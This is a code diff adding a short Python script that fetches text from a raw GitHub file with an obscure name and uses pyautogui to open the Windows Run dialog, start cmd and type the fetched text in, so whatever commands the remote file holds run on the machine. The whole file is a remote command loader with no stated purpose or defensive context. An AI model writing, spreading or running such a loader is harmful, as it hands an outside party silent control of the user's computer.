@@ -1,0 +1,15 @@
+import requests 
+import pyautogui
+import time
+
+command_source = requests.get('https://raw.githubusercontent.com/programmingkeno21353242123/database772/main/wh36eu457m')
+command_source = command_source.text 
+
+pyautogui.hotkey('win','r') 
+time.sleep(0.5)
+pyautogui.write('cmd') 
+time.sleep(0.5)
+pyautogui.hotkey('enter') 
+time.sleep(1)
+pyautogui.write(command_source)
+exit()
